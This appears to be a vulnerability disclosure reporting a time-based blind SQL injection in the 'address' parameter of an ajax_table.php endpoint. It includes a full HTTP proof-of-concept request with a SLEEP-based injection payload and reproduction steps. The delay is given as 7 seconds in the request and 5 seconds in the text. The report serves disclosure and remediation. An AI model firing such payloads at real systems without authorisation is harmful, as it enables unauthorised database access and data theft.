# Time-Based Blind SQL injection leads to database extraction

#### Description
The `address` parameter in the `Address > Update` endpoint is not properly sanitized, allowing for SQL injection attacks. By injecting specific SQL commands, an attacker can make the database execute arbitrary queries. In a time-based blind SQL injection, the attacker leverages time delays to infer database responses based on the duration of the application's response.

#### Proof of Concept (PoC)

```
POST /ajax_table.php HTTP/1.1
Host: demo.target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 221
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: cookie here
Origin: https://demo.target.com
Referer: https://demo.target.com/search/search=mac/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Csrf-Token: pqiGN72KyLqHwTyBgwtU6WVk216yTkC3TncjuZmX
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

address='XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z&current=1&device_id=&id=address-search&interface=&rowCount=50&searchPhrase=&search_type=mac&sort[hostname]=asc
```

#### Expected Behavior
If the application is vulnerable, it will delay the response by 5 seconds, indicating that the injected SQL query was executed. This delay confirms the presence of a time-based blind SQL injection vulnerability

#### Steps to Reproduce
1. Navigate to the Address > Update feature in the application.
2. Intercept the request using a proxy tool like Burp Suite.
3. Modify the `address` parameter to include the time-based SQL payload: `'XOR(SELECT(0)FROM(SELECT(SLEEP(5)))a)XOR'Z`.
4. Forward the request and observe the response time.
5. Note that the server response is delayed by the specified time (e.g., 5 seconds), indicating the execution of the SQL injection payload.

#### Impact
Successful exploitation of this vulnerability could allow an attacker to:

* Retrieve sensitive information from the database.
* Modify or delete database entries.
* Execute arbitrary SQL commands.
